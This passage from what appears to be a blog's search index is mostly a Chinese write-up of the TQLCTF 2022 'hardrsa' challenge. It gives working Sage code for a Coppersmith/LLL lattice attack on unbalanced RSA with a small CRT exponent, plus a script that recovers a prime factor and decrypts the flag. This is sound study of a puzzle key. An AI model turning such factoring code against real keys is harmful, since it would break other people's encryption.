class="token punctuation">:</span> w3<span class="token punctuation">.</span>toWei<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token string">'wei'</span><span class="token punctuation">)</span><span class="token punctuation">,</span>            <span class="token string">'nonce'</span><span class="token punctuation">:</span> w3<span class="token punctuation">.</span>eth<span class="token punctuation">.</span>getTransactionCount<span class="token punctuation">(</span>account<span class="token punctuation">.</span>address<span class="token punctuation">)</span><span class="token punctuation">,</span>            <span class="token string">'value'</span><span class="token punctuation">:</span> w3<span class="token punctuation">.</span>toWei<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token string">'wei'</span><span class="token punctuation">)</span>        <span class="token punctuation">}</span><span class="token punctuation">)</span>        signed_txn <span class="token operator">=</span> w3<span class="token punctuation">.</span>eth<span class="token punctuation">.</span>account<span class="token punctuation">.</span>signTransaction<span class="token punctuation">(</span>TransactionData<span class="token punctuation">,</span> private_key<span class="token punctuation">)</span>        txn_hash <span class="token operator">=</span> w3<span class="token punctuation">.</span>eth<span class="token punctuation">.</span>sendRawTransaction<span class="token punctuation">(</span>signed_txn<span class="token punctuation">.</span>rawTransaction<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token builtin">hex</span><span class="token punctuation">(</span><span class="token punctuation">)</span>        txrecipet <span class="token operator">=</span> w3<span class="token punctuation">.</span>eth<span class="token punctuation">.</span>waitForTransactionReceipt<span class="token punctuation">(</span>txn_hash<span class="token punctuation">)</span>        <span class="token keyword">assert</span> txrecipet<span class="token punctuation">[</span><span class="token string">'status'</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">1</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>TQLCTF2022 hardrsa</title>
      <link href="/2022/04/20/tqlctf-2022.2.19-2022.2.20/"/>
      <url>/2022/04/20/tqlctf-2022.2.19-2022.2.20/</url>
      
        <content type="html"><![CDATA[<h1 id="TQLCTF-2022-2-19-2022-2-20"><a href="#TQLCTF-2022-2-19-2022-2-20" class="headerlink" title="TQLCTF 2022.2.19-2022.2.20"></a>TQLCTF 2022.2.19-2022.2.20</h1><h2 id="hardrsa"><a href="#hardrsa" class="headerlink" title="hardrsa"></a>hardrsa</h2><h3 id="题目源码："><a href="#题目源码：" class="headerlink" title="题目源码："></a>题目源码：</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> sage<span class="token punctuation">.</span><span class="token builtin">all</span> <span class="token keyword">import</span> <span class="token operator">*</span><span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Util<span class="token punctuation">.</span>number <span class="token keyword">import</span> bytes_to_long<span class="token keyword">from</span> secret <span class="token keyword">import</span> flag<span class="token keyword">assert</span> flag<span class="token punctuation">.</span>startswith<span class="token punctuation">(</span><span class="token string">"TQLCTF{"</span><span class="token punctuation">)</span><span class="token keyword">assert</span> flag<span class="token punctuation">.</span>endswith<span class="token punctuation">(</span><span class="token string">"}"</span><span class="token punctuation">)</span>beta  <span class="token operator">=</span> <span class="token number">0.223</span>delta <span class="token operator">=</span> <span class="token number">0.226</span>gama  <span class="token operator">=</span> <span class="token number">0.292</span>n_size <span class="token operator">=</span> <span class="token number">1024</span>bound_q <span class="token operator">=</span> <span class="token number">2</span><span class="token operator">**</span><span class="token builtin">int</span><span class="token punctuation">(</span>n_size<span class="token operator">*</span>beta<span class="token punctuation">)</span>bound_p <span class="token operator">=</span> <span class="token number">2</span><span class="token operator">**</span><span class="token builtin">int</span><span class="token punctuation">(</span>n_size<span class="token operator">*</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token operator">-</span>beta<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>    p <span class="token operator">=</span> random_prime<span class="token punctuation">(</span>bound_p<span class="token punctuation">,</span> proof<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span>    q <span class="token operator">=</span> random_prime<span class="token punctuation">(</span>bound_q<span class="token punctuation">,</span> proof<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span>    N <span class="token operator">=</span> p <span class="token operator">*</span> q    <span class="token keyword">if</span> q <span class="token operator">&lt;</span> <span class="token builtin">pow</span><span class="token punctuation">(</span>N<span class="token punctuation">,</span> beta<span class="token punctuation">)</span> <span class="token keyword">and</span> gcd<span class="token punctuation">(</span>p<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>q<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">/</span><span class="token number">2</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">:</span>        <span class="token keyword">break</span>        <span class="token keyword">assert</span> p<span class="token punctuation">.</span>is_prime<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">assert</span> q<span class="token punctuation">.</span>is_prime<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>    dp <span class="token operator">=</span> randint<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token operator">**</span><span class="token builtin">int</span><span class="token punctuation">(</span>n_size <span class="token operator">*</span> delta<span class="token punctuation">)</span><span class="token punctuation">)</span>    dq <span class="token operator">=</span> randint<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>q<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> gcd<span class="token punctuation">(</span>dp<span class="token punctuation">,</span> p<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">1</span> <span class="token keyword">and</span> gcd<span class="token punctuation">(</span>dq<span class="token punctuation">,</span> <span class="token punctuation">(</span>q<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">/</span><span class="token number">2</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">:</span>        <span class="token keyword">break</span>        d <span class="token operator">=</span> crt<span class="token punctuation">(</span><span class="token punctuation">[</span>dp<span class="token punctuation">,</span> dq<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span>p<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>q<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">/</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span>e <span class="token operator">=</span> inverse_mod<span class="token punctuation">(</span>d<span class="token punctuation">,</span> <span class="token punctuation">(</span>p<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token punctuation">(</span>q<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">/</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token keyword">assert</span> d <span class="token operator">&gt;</span> <span class="token number">2</span> <span class="token operator">*</span> N <span class="token operator">**</span> gamam <span class="token operator">=</span> bytes_to_long<span class="token punctuation">(</span>flag<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"N=</span><span class="token interpolation"><span class="token punctuation">{</span>N<span class="token punctuation">}</span></span><span class="token string">\ne=</span><span class="token interpolation"><span class="token punctuation">{</span>e<span class="token punctuation">}</span></span><span class="token string">"</span></span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"c=</span><span class="token interpolation"><span class="token punctuation">{</span><span class="token builtin">pow</span><span class="token punctuation">(</span>m<span class="token punctuation">,</span>e<span class="token punctuation">,</span>N<span class="token punctuation">)</span><span class="token punctuation">}</span></span><span class="token string">"</span></span><span class="token punctuation">)</span><span class="token comment">#N=17898692915537057253027340409848777379525990043216176404521845629792286203459681133425615460580210961931628383718238208402935069434512008997422795968676635886265184398587211149645171148089263697198308448184434844310802022336492929706736607458307830462086477073132852687216229392067680807130235274969547247389</span><span class="token comment">#e=7545551830675702855400776411651853827548700298411139797799936263327967930532764763078562198672340967918924251144028131553633521880515798926665667805615808959981427173796925381781834763784420392535231864547193756385722359555841096299828227134582178397639173696868619386281360614726834658925680670513451826507</span><span class="token comment">#c=2031772143331409088299956894510278261053644235222590973258899052809440238898925631603059180509792948749674390704473123551866909789808259315538758248037806795516031585011977710042943997673076463232373915245996143847637737207984866535157697240588441997103830717158181959653034344529914097609427019775229834115</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><p>观察到脚本中有<code>beta</code> 、<code>delta</code> 、<code>gama</code>等参数，猜测本题应该会与coppersmith攻击和lattice相关</p><p>同时可以观察到加密脚本中使用了CRT对RSA的使用</p><p>并且p,q两素数位数相差过大，故根据关键词<em>coppersmith、lattice、CRT、RSA</em>进行检索，搜索到 Alexander May在2002年发表的一篇论文<em>Cryptanalysis of Unbalanced RSA with Small CRT-Exponent</em></p><p>发现其中情况与题目中描述的完全一致，并且满足<strong>section 5</strong> 中<strong>An approach modulo e</strong>的情况，故仔细阅读该部分，实现其攻击方法。</p><h3 id="实现"><a href="#实现" class="headerlink" title="实现"></a>实现</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">attack</span><span class="token punctuation">(</span>mm<span class="token operator">=</span><span class="token number">2</span><span class="token punctuation">,</span>tt<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">,</span>debug<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    beta  <span class="token operator">=</span> <span class="token number">0.233</span>    delta <span class="token operator">=</span> <span class="token number">0.226</span>    gama  <span class="token operator">=</span> <span class="token number">0.292</span>    <span class="token comment"># print(1-2/3*(beta+sqrt(3*beta+beta^2)))</span>    <span class="token comment">#原题的数据</span>    N<span class="token operator">=</span><span class="token number">17898692915537057253027340409848777379525990043216176404521845629792286203459681133425615460580210961931628383718238208402935069434512008997422795968676635886265184398587211149645171148089263697198308448184434844310802022336492929706736607458307830462086477073132852687216229392067680807130235274969547247389</span>    e<span class="token operator">=</span><span class="token number">7545551830675702855400776411651853827548700298411139797799936263327967930532764763078562198672340967918924251144028131553633521880515798926665667805615808959981427173796925381781834763784420392535231864547193756385722359555841096299828227134582178397639173696868619386281360614726834658925680670513451826507</span>    c<span class="token operator">=</span><span class="token number">2031772143331409088299956894510278261053644235222590973258899052809440238898925631603059180509792948749674390704473123551866909789808259315538758248037806795516031585011977710042943997673076463232373915245996143847637737207984866535157697240588441997103830717158181959653034344529914097609427019775229834115</span>        Y<span class="token operator">=</span>floor<span class="token punctuation">(</span><span class="token builtin">pow</span><span class="token punctuation">(</span>N<span class="token punctuation">,</span>delta<span class="token operator">+</span>beta<span class="token punctuation">)</span><span class="token punctuation">)</span>    Z<span class="token operator">=</span>floor<span class="token punctuation">(</span><span class="token builtin">pow</span><span class="token punctuation">(</span>N<span class="token punctuation">,</span>beta<span class="token punctuation">)</span><span class="token punctuation">)</span>        dd<span class="token operator">=</span><span class="token punctuation">(</span>mm<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token punctuation">(</span>mm<span class="token operator">+</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token operator">/</span><span class="token number">2</span><span class="token operator">+</span>tt<span class="token operator">*</span><span class="token punctuation">(</span>mm<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span>    P<span class="token punctuation">.</span><span class="token operator">&lt;</span>y<span class="token punctuation">,</span>z<span class="token operator">&gt;</span> <span class="token operator">=</span> PolynomialRing<span class="token punctuation">(</span>ZZ<span class="token punctuation">)</span>    pol<span class="token operator">=</span>y<span class="token operator">*</span><span class="token punctuation">(</span>N<span class="token operator">-</span>z<span class="token punctuation">)</span><span class="token operator">+</span>N        <span class="token comment"># print(pol(y=k-1,z=q)%e)</span>    G <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>    <span class="token keyword">for</span> ii <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>mm<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">for</span> jj <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>mm<span class="token operator">-</span>ii<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            G<span class="token punctuation">.</span>append<span class="token punctuation">(</span>e<span class="token operator">**</span><span class="token punctuation">(</span>mm<span class="token operator">-</span>ii<span class="token punctuation">)</span><span class="token operator">*</span><span class="token punctuation">(</span>y<span class="token punctuation">)</span><span class="token operator">**</span>jj<span class="token operator">*</span>pol<span class="token punctuation">(</span>y<span class="token punctuation">,</span>z<span class="token punctuation">)</span><span class="token operator">**</span>ii<span class="token punctuation">)</span>    <span class="token keyword">for</span> ii <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>mm<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">for</span> jj <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>tt<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            G<span class="token punctuation">.</span>append<span class="token punctuation">(</span>e<span class="token operator">**</span><span class="token punctuation">(</span>mm<span class="token operator">-</span>ii<span class="token punctuation">)</span><span class="token operator">*</span><span class="token punctuation">(</span>z<span class="token punctuation">)</span><span class="token operator">**</span>jj<span class="token operator">*</span>pol<span class="token punctuation">(</span>y<span class="token punctuation">,</span>z<span class="token punctuation">)</span><span class="token operator">**</span>ii<span class="token punctuation">)</span>    monomials <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> G<span class="token punctuation">:</span>        <span class="token keyword">for</span> j <span class="token keyword">in</span> i<span class="token punctuation">.</span>monomials<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">if</span> j <span class="token keyword">not</span> <span class="token keyword">in</span> monomials<span class="token punctuation">:</span>                monomials<span class="token punctuation">.</span>append<span class="token punctuation">(</span>j<span class="token punctuation">)</span>    monomials<span class="token punctuation">.</span>sort<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token comment"># Construct lattice spanned by polynomials with yY and zZ</span>    L <span class="token operator">=</span> matrix<span class="token punctuation">(</span>ZZ<span class="token punctuation">,</span><span class="token builtin">len</span><span class="token punctuation">(</span>monomials<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>monomials<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>monomials<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            L<span class="token punctuation">[</span>i<span class="token punctuation">,</span>j<span class="token punctuation">]</span> <span class="token operator">=</span> G<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">(</span>Y<span class="token operator">*</span>y<span class="token punctuation">,</span>Z<span class="token operator">*</span>z<span class="token punctuation">)</span><span class="token punctuation">.</span>monomial_coefficient<span class="token punctuation">(</span>monomials<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token comment"># makes lattice upper triangular</span>    L <span class="token operator">=</span> matrix<span class="token punctuation">(</span>ZZ<span class="token punctuation">,</span>L<span class="token punctuation">)</span>    <span class="token keyword">if</span> debug<span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Bitlengths of matrix elements (before reduction):"</span><span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>L<span class="token punctuation">.</span>apply_map<span class="token punctuation">(</span><span class="token keyword">lambda</span> x<span class="token punctuation">:</span> x<span class="token punctuation">.</span>nbits<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token builtin">str</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    L <span class="token operator">=</span> L<span class="token punctuation">.</span>LLL<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> debug<span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Bitlengths of matrix elements (after reduction):"</span><span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>L<span class="token punctuation">.</span>apply_map<span class="token punctuation">(</span><span class="token keyword">lambda</span> x<span class="token punctuation">:</span> x<span class="token punctuation">.</span>nbits<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token builtin">str</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    roots <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>    pol1 <span class="token operator">=</span> P<span class="token punctuation">(</span><span class="token builtin">sum</span><span class="token punctuation">(</span><span class="token builtin">map</span><span class="token punctuation">(</span>mul<span class="token punctuation">,</span> <span class="token builtin">zip</span><span class="token punctuation">(</span>L<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span>monomials<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">(</span>y<span class="token operator">/</span>Y<span class="token punctuation">,</span>z<span class="token operator">/</span>Z<span class="token punctuation">)</span><span class="token punctuation">)</span>    pol2 <span class="token operator">=</span> P<span class="token punctuation">(</span><span class="token builtin">sum</span><span class="token punctuation">(</span><span class="token builtin">map</span><span class="token punctuation">(</span>mul<span class="token punctuation">,</span> <span class="token builtin">zip</span><span class="token punctuation">(</span>L<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span>monomials<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">(</span>y<span class="token operator">/</span>Y<span class="token punctuation">,</span>z<span class="token operator">/</span>Z<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token comment"># print(pol1(y=k-1,z=q)%e)</span>    <span class="token keyword">if</span> L<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>norm<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">&gt;</span> <span class="token punctuation">(</span>e<span class="token operator">^</span>mm<span class="token punctuation">)</span><span class="token operator">/</span>sqrt<span class="token punctuation">(</span>dd<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">raise</span> ValueError<span class="token punctuation">(</span><span class="token string">"Can't attack,plz try bigger m,t"</span><span class="token punctuation">)</span>    r <span class="token operator">=</span> pol2<span class="token punctuation">.</span>resultant<span class="token punctuation">(</span>pol1<span class="token punctuation">,</span> y<span class="token punctuation">)</span>    <span class="token keyword">if</span> r<span class="token punctuation">.</span>is_constant<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">return</span>     <span class="token keyword">for</span> z0<span class="token punctuation">,</span> _ <span class="token keyword">in</span> r<span class="token punctuation">.</span>univariate_polynomial<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>roots<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        roots<span class="token punctuation">.</span>append<span class="token punctuation">(</span>z0<span class="token punctuation">)</span>        <span class="token keyword">if</span> debug<span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Potential z0:"</span><span class="token punctuation">,</span>z0<span class="token punctuation">)</span>    <span class="token keyword">return</span> roots<span class="token keyword">print</span><span class="token punctuation">(</span>attack<span class="token punctuation">(</span>mm<span class="token operator">=</span><span class="token number">6</span><span class="token punctuation">,</span>tt<span class="token operator">=</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>其中，将参数mm和tt提升到（6，4）的时候，运行一小段时间后可以得到结果</p><p>即<code>q=169137218869484728712814942277531819318585090563481420862437016566714151</code></p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> gmpy2 <span class="token keyword">import</span> powmod<span class="token punctuation">,</span>invert<span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Util<span class="token punctuation">.</span>number <span class="token keyword">import</span> long_to_bytesN<span class="token operator">=</span><span class="token number">17898692915537057253027340409848777379525990043216176404521845629792286203459681133425615460580210961931628383718238208402935069434512008997422795968676635886265184398587211149645171148089263697198308448184434844310802022336492929706736607458307830462086477073132852687216229392067680807130235274969547247389</span>e<span class="token operator">=</span><span class="token number">7545551830675702855400776411651853827548700298411139797799936263327967930532764763078562198672340967918924251144028131553633521880515798926665667805615808959981427173796925381781834763784420392535231864547193756385722359555841096299828227134582178397639173696868619386281360614726834658925680670513451826507</span>c<span class="token operator">=</span><span class="token number">2031772143331409088299956894510278261053644235222590973258899052809440238898925631603059180509792948749674390704473123551866909789808259315538758248037806795516031585011977710042943997673076463232373915245996143847637737207984866535157697240588441997103830717158181959653034344529914097609427019775229834115</span>    q<span class="token operator">=</span><span class="token number">169137218869484728712814942277531819318585090563481420862437016566714151</span>p<span class="token operator">=</span>N<span class="token operator">//</span>qd<span class="token operator">=</span>invert<span class="token punctuation">(</span>e<span class="token punctuation">,</span><span class="token punctuation">(</span>p<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token punctuation">(</span>q<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">//</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>long_to_bytes<span class="token punctuation">(</span>powmod<span class="token punctuation">(</span>c<span class="token punctuation">,</span>d<span class="token punctuation">,</span>N<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>可以得到flag</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>My Frist Post</title>
      <link href="/2022/04/20/my-frist-post/"/>
      <url>/2022/04/20/my-frist-post/</url>
      
        <content type="html"><![CDATA[<p>Hello! This is my frist blog post. Welcome to latt1ce’s home~  </p>]]></content>
      
      
      
    </entry>
    
    
  
  
</search>
